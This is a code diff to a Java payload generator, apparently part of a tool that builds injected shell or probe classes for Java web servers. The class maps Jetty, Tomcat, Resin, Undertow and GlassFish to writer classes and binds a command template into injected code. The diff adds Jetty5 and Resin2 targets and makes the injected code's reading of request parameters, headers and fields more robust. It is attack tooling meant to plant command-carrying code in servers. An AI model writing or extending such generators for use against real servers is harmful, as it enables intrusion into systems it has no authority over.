@@ -52,9 +52,9 @@ public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyC
                 .name(probeConfig.getShellClassName())
                 .visit(new TargetJreVersionVisitorWrapper(probeConfig.getTargetJreVersion()))
                 .visit(Advice.withCustomMapping()
-                                .bind(ValueAnnotation.class, probeContentConfig.getCommandTemplate())
-                                .to(runnerClass)
-                                .on(named("run")));
+                        .bind(ValueAnnotation.class, probeContentConfig.getCommandTemplate())
+                        .to(runnerClass)
+                        .on(named("run")));
         String base64Bytes = probeContentConfig.getBase64Bytes();
         if (StringUtils.isNotBlank(base64Bytes)) {
             builder = builder.method(named("getDataFromReq")).intercept(FixedValue.value(base64Bytes));
@@ -86,6 +86,7 @@ public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyC
             case Server.SpringWebMvc:
                 return SpringWebMvcWriter.class;
             case Server.Jetty:
+            case Server.Jetty5:
                 return JettyWriter.class;
             case Server.Tomcat:
             case Server.JBoss:
@@ -95,6 +96,8 @@ public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyC
                 return TongWebWriter.class;
             case Server.Resin:
                 return ResinWriter.class;
+            case Server.Resin2:
+                return Resin2Writer.class;
             case Server.Undertow:
                 return UndertowWriter.class;
             case Server.GlassFish:
@@ -118,15 +121,24 @@ public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyC
         public static void enter(@Advice.Argument(value = 0) Object request,
                                  @ValueAnnotation String name,
                                  @Advice.Return(readOnly = false) String ret) throws Exception {
+            String p = null;
             try {
-                String p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
-                if (p == null || p.isEmpty()) {
-                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
-                }
-                ret = p;
-            } catch (Exception e) {
-                ret = null;
+                p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
+            } catch (Exception ignored) {
             }
+            if (p == null || p.isEmpty()) {
+                try {
+                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
+                } catch (Exception ignored) {
+                }
+            }
+            if (p == null || p.isEmpty()) {
+                try {
+                    p = (String) ShellCommonUtil.invokeMethod(request, "getField", new Class[]{String.class}, new Object[]{name});
+                } catch (Exception ignored) {
+                }
+            }
+            ret = p;
         }
     }
 
@@ -135,22 +147,33 @@ public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyC
         public static void enter(@Advice.Argument(value = 0) Object request,
                                  @ValueAnnotation String name,
                                  @Advice.Return(readOnly = false) String ret) throws Exception {
+            String p = null;
             try {
-                String p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
-                if (p == null || p.isEmpty()) {
-                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
-                }
-                ret = p;
+                p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
             } catch (Exception e) {
+            }
+            if (p == null || p.isEmpty()) {
+                try {
+                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
+                } catch (Exception ignored) {
+                }
+            }
+            if (p == null || p.isEmpty()) {
+                try {
+                    p = (String) ShellCommonUtil.invokeMethod(request, "getField", new Class[]{String.class}, new Object[]{name});
+                } catch (Exception ignored) {
+                }
+            }
+            if (p == null || p.isEmpty()) {
                 Class<?> requestClass = request.getClass().getClassLoader().loadClass("org.eclipse.jetty.server.Request");
                 Object parameters = requestClass.getMethod("extractQueryParameters", requestClass, Charset.class).invoke(null, request, UTF_8);
-                String p = (String) ShellCommonUtil.invokeMethod(parameters, "getValue", new Class[]{String.class}, new Object[]{name});
-                if (p == null || p.isEmpty()) {
-                    Object headers = ShellCommonUtil.invokeMethod(request, "getHeaders", null, null);
-                    p = (String) ShellCommonUtil.invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{name});
-                }
-                ret = p;
+                p = (String) ShellCommonUtil.invokeMethod(parameters, "getValue", new Class[]{String.class}, new Object[]{name});
             }
+            if (p == null || p.isEmpty()) {
+                Object headers = ShellCommonUtil.invokeMethod(request, "getHeaders", null, null);
+                p = (String) ShellCommonUtil.invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{name});
+            }
+            ret = p;
         }
     }
 
@@ -158,7 +181,5 @@ public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyC
     public @interface ValueAnnotation {
     }
 }
-
-
 
 
